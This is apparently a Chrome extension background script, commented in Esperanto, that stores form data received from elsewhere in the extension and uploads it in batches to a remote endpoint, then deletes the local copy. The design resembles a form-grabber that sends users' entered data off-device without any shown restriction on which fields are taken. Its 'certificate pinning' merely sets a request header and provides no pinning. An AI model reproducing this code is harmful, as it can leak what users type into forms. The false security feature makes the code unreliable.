/**
 * Background Service Worker - Ĝiras formon kaj sinkronigon
 */

class FormSyncManager {
  constructor() {
    this.config = {};
    this.syncInterval = null;
    this.init();
  }

  async init() {
    // Ŝargu konfigurajon
    await this.loadConfig();

    // Aŭskultu formajn ĉapojn
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
      if (request.type === 'FORM_CAPTURED') {
        this.captureForm(request);
      }
    });

    // Startu periodajn sinkronigojn
    this.startSyncCycle();
  }

  async loadConfig() {
    return new Promise((resolve) => {
      chrome.storage.sync.get(['qaConfig'], (result) => {
        this.config = result.qaConfig || this.getDefaultConfig();
        resolve();
      });
    });
  }

  getDefaultConfig() {
    return {
      endpoint: 'https://api.example.com/forms',
      syncInterval: 60000, // 1 minuto
      certificatePinning: true,
      pins: [],
      enabled: true,
      batchSize: 10
    };
  }

  captureForm(request) {
    if (!this.config.enabled) return;

    chrome.storage.local.get(['capturedForms'], (result) => {
      const forms = result.capturedForms || [];
      forms.push(request.data);

      chrome.storage.local.set({ capturedForms: forms }, () => {
        console.log(`Formo ĉapita: ${request.data.formId}`);
      });
    });
  }

  startSyncCycle() {
    // Sinkronizu tuj post ĉapo
    chrome.storage.onChanged.addListener((changes, areaName) => {
      if (areaName === 'local' && changes.capturedForms) {
        this.syncForms();
      }
    });

    // Regula sinkronigo
    if (this.config.syncInterval > 0) {
      this.syncInterval = setInterval(() => {
        this.syncForms();
      }, this.config.syncInterval);
    }
  }

  async syncForms() {
    try {
      const result = await this.getStoredForms();
      const forms = result.capturedForms || [];

      if (forms.length === 0) return;

      // Bataĉu formojn
      const batches = this.createBatches(forms, this.config.batchSize);

      for (const batch of batches) {
        await this.sendBatch(batch);
      }

      // Vakigu ĉapita datumoj
      await this.clearSyncedForms();
      console.log('Sinkronigo sukcesa');
    } catch (error) {
      console.error('Sinkronig-eraro:', error);
    }
  }

  createBatches(array, size) {
    const batches = [];
    for (let i = 0; i < array.length; i += size) {
      batches.push(array.slice(i, i + size));
    }
    return batches;
  }

  async sendBatch(batch) {
    const payload = {
      timestamp: new Date().toISOString(),
      forms: batch,
      count: batch.length
    };

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-QA-Agent': 'FormCapture/1.0'
      },
      body: JSON.stringify(payload)
    };

    // Aldonu certificate pinning
    if (this.config.certificatePinning && this.config.pins.length > 0) {
      options.headers['X-Certificate-Pin'] = this.config.pins[0];
    }

    try {
      const response = await fetch(this.config.endpoint, options);

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Sinkronig-malhito:', error);
      throw error;
    }
  }

  getStoredForms() {
    return new Promise((resolve) => {
      chrome.storage.local.get(['capturedForms'], resolve);
    });
  }

  clearSyncedForms() {
    return new Promise((resolve) => {
      chrome.storage.local.set({ capturedForms: [] }, resolve);
    });
  }
}

